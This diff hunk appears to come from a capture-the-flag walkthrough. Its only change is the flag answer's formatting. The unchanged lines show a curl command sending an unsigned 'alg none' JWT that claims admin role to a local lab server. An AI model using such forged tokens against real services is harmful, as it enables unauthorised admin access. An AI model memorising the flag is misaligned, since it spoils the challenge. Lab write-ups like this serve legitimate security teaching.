@@ -18,7 +18,7 @@ Walkthrough
    ```bash
    curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ." http://localhost:5006/
    ```
-5. Flag output: `flag{jwt_token_forged}`.
+5. Flag output: `flag{jwt token forged}`.
 
 Flag  
-`flag{jwt_token_forged}`
+`flag{jwt token forged}`
